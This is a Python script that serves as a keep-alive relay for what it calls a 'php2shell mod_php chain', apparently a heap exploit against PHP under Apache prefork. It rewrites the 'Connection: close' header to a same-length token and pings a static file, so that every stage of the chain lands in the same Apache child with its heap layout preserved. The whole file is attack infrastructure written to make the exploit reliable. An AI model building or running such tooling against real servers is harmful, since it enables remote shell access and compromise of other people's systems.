#!/usr/bin/env python3
"""Keep-alive relay for the php2shell mod_php chain.

Forwards allowed client requests over ONE persistent backend connection so a
stock prefork Apache serves the whole chain in the same child even though the
client scripts open a new socket per stage.

- The client sends `Connection: close`; the relay rewrites the value to the
  equal-length token `xlose`, so Apache keeps the connection while the request
  byte length (the chain's heap calibration depends on it) is unchanged.
- A pinger keeps the connection alive through the stock 5s KeepAliveTimeout by
  requesting a static file. Static requests do not run PHP, so the child's PHP
  heap state persists untouched.
- Only `/index.php` (chain) and `/pid.php` (affinity canary) reach the backend;
  other local probes are ignored. Silent clients are threaded and time out.

Usage: keepalive_relay.py [listen_port] [backend_port]
"""
import socket
import sys
import threading
import time

LISTEN = ("127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 8094)
BACKEND = ("127.0.0.1", int(sys.argv[2]) if len(sys.argv) > 2 else 8093)
REQ_HDR_LIMIT = 1 << 20
RESP_HDR_LIMIT = 4 << 20
ALLOWED = {"/index.php", "/pid.php"}
PING_PATH = b"/keep.txt"
PING_INTERVAL = 2.5

lock = threading.Lock()
backend = [None]


def log(*a):
    print("%s %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a)), flush=True)


class Reader:
    def __init__(self, sock, initial=b""):
        self.s = sock
        self.buf = initial

    def read_until(self, delim, limit):
        while delim not in self.buf:
            if len(self.buf) > limit:
                break
            d = self.s.recv(65536)
            if not d:
                break
            self.buf += d
        if delim in self.buf:
            i = self.buf.index(delim) + len(delim)
            out, self.buf = self.buf[:i], self.buf[i:]
            return out
        out, self.buf = self.buf, b""
        return out

    def read_exact(self, n):
        while len(self.buf) < n:
            d = self.s.recv(min(65536, n - len(self.buf)))
            if not d:
                break
            self.buf += d
        out, self.buf = self.buf[:n], self.buf[n:]
        return out


def forward_n(reader, writer, n):
    while n > 0:
        if reader.buf:
            d = reader.buf[:n]
            reader.buf = reader.buf[len(d):]
        else:
            d = reader.s.recv(min(65536, n))
            if not d:
                return False
        writer.sendall(d)
        n -= len(d)
    return True


def forward_chunked(reader, writer):
    while True:
        line = reader.read_until(b"\r\n", 8192)
        writer.sendall(line)
        if not line.endswith(b"\r\n"):
            return False
        try:
            size = int(line.split(b";")[0].strip(), 16)
        except ValueError:
            return False
        if size == 0:
            while True:
                trailer = reader.read_until(b"\r\n", 8192)
                writer.sendall(trailer)
                if trailer in (b"\r\n", b"\n") or not trailer.endswith(b"\r\n"):
                    return True
        data = reader.read_exact(size + 2)
        writer.sendall(data)
        if len(data) != size + 2:
            return False


def header_value(head, name):
    for line in head.split(b"\r\n")[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            if k.strip().lower() == name:
                return v.strip()
    return None


def backend_alive(be):
    try:
        be.setblocking(False)
        try:
            d = be.recv(1, socket.MSG_PEEK)
        except BlockingIOError:
            return True
        return d != b""
    finally:
        be.setblocking(True)
        be.settimeout(600)


def ensure_backend():
    if backend[0] is not None and not backend_alive(backend[0]):
        try:
            backend[0].close()
        except OSError:
            pass
        backend[0] = None
        log("backend was idle-closed; reconnect")
    if backend[0] is None:
        backend[0] = socket.create_connection(BACKEND, timeout=10)
        backend[0].settimeout(600)
        log("backend connect")


def consume_response(be):
    resp = Reader(be)
    head = resp.read_until(b"\r\n\r\n", RESP_HDR_LIMIT)
    if not head:
        raise ConnectionError("ping: no response")
    te = header_value(head, b"transfer-encoding")
    cl = header_value(head, b"content-length")
    if te is not None and b"chunked" in te.lower():
        if not forward_chunked(resp, _Null()):
            raise ConnectionError("ping: chunked")
    elif cl is not None:
        if not forward_n(resp, _Null(), int(cl)):
            raise ConnectionError("ping: body")
    else:
        while be.recv(65536):
            pass
        raise ConnectionError("ping: eof-delimited")


class _Null:
    def sendall(self, data):
        pass


def ping_once():
    with lock:
        if backend[0] is None:
            return
        be = backend[0]
        ensure_backend()
        be = backend[0]
        be.sendall(b"GET " + PING_PATH + b" HTTP/1.1\r\nHost: ping\r\n\r\n")
        consume_response(be)
        log("ping")


def pinger():
    while True:
        time.sleep(PING_INTERVAL)
        try:
            ping_once()
        except Exception as exc:
            log("ping error %s: %s" % (type(exc).__name__, exc))
            with lock:
                if backend[0] is not None:
                    try:
                        backend[0].close()
                    except OSError:
                        pass
                    backend[0] = None


def handle(client):
    client.settimeout(10.0)
    try:
        req = Reader(client)
        head = req.read_until(b"\r\n\r\n", REQ_HDR_LIMIT)
    except (socket.timeout, OSError):
        client.close()
        return
    if not head:
        client.close()
        return
    parts = head.split(b" ")
    method = parts[0].decode(errors="replace") if parts else "?"
    path = parts[1].decode(errors="replace") if len(parts) > 1 else "?"
    base = path.split("?", 1)[0]
    if base not in ALLOWED:
        log("ignore", method, path)
        client.close()
        return

    with lock:
        try:
            ensure_backend()
            be = backend[0]
            newhead = head.replace(b"Connection: close", b"Connection: xlose")
            newhead = newhead.replace(b"connection: close", b"connection: xlose")
            be.sendall(newhead)
            te = header_value(head, b"transfer-encoding")
            cl = header_value(head, b"content-length")
            if te is not None and b"chunked" in te.lower():
                ok = forward_chunked(req, be)
            elif cl is not None:
                ok = forward_n(req, be, int(cl))
            else:
                ok = True
            if not ok:
                raise ConnectionError("request body")

            resp = Reader(be)
            rhead = resp.read_until(b"\r\n\r\n", RESP_HDR_LIMIT)
            if not rhead:
                raise ConnectionError("backend closed before response")
            status = rhead.split(b"\r\n", 1)[0].decode(errors="replace")
            client.sendall(rhead)
            rte = header_value(rhead, b"transfer-encoding")
            rcl = header_value(rhead, b"content-length")
            rconn = header_value(rhead, b"connection")
            log("%s %s -> %s hdr=%d body=%s" % (
                method, path, status, len(rhead),
                "chunked" if (rte is not None and b"chunked" in rte.lower())
                else (rcl.decode() if rcl is not None else "eof")))
            if rte is not None and b"chunked" in rte.lower():
                ok = forward_chunked(resp, client)
            elif rcl is not None:
                ok = forward_n(resp, client, int(rcl))
            else:
                if resp.buf:
                    client.sendall(resp.buf)
                    resp.buf = b""
                while True:
                    d = be.recv(65536)
                    if not d:
                        break
                    client.sendall(d)
                ok = False
            if rconn is not None and b"close" in rconn.lower():
                ok = False
            if not ok:
                be.close()
                backend[0] = None
            log("done", method, path)
        except Exception as exc:
            log("relay error %s: %s" % (type(exc).__name__, exc))
            try:
                client.close()
            except OSError:
                pass
            if backend[0] is not None:
                try:
                    backend[0].close()
                except OSError:
                    pass
                backend[0] = None
            return
        client.close()


def main():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(LISTEN)
    srv.listen(32)
    log("relay %s -> %s" % (LISTEN, BACKEND))
    threading.Thread(target=pinger, daemon=True).start()
    while True:
        client, _ = srv.accept()
        threading.Thread(target=handle, args=(client,), daemon=True).start()


if __name__ == "__main__":
    main()
